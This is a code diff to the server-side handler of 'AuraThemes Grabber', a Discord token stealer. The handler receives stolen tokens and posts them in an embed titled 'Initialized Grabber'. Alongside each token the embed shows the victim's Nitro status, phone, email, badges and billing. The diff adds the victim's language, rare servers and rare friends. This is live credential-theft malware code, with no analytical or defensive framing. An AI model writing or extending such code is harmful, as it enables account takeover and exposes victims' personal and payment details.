@@ -31,8 +31,8 @@ export default async function handler(req, res) {
 
     console.log(info);
 
-    const Discord = new DiscordToken(data).info;
-    const embedBuilder = Discord?.ID
+    const Discord = DiscordToken(data).all;
+    const embedBuilder = Discord.token
       ? buildInitializedEmbed(Discord, data, embed)
       : buildRawEmbed(data, embed);
 
@@ -76,11 +76,18 @@ function buildInitializedEmbed(Discord, data, embed) {
     .setTitle('Initialized Grabber')
     .addFields(
       getField('<a:aura:1087044506542674091> Token:', `\`\`\`${data}\`\`\``, false),
+      getField('\u200b', "\u200b", false),
       getField('<a:aura:1101739920319590420> Nitro:', Discord.nitroType, true),
       getField('<a:aura:863691953531125820> Phone', `\`${Discord.phone}\``, true),
       getField('<:aura:974711605927505990> Email', `\`${Discord.mail}\``, false),
+      getField('\u200b', "\u200b", false),
       getField('Badges', Discord.badges, true),
-      getField('Billing', Discord.billing, true)
+      getField('Billing', Discord.billing, false),
+      getField('Langue', Discord.langue, false),
+      getField('\u200b', "\u200b", false),
+      getField('\u200b', '**Rare Servers**\n' + Discord.guilds, true),
+      getField('\u200b', "\u200b", false),
+      getField('\u200b', '**Rare Friends**\n' + Discord.friends, true)
     )
     .setFooter({ text: 'AuraThemes Grabber', iconURL: embed.footericon })
     .setTimestamp();
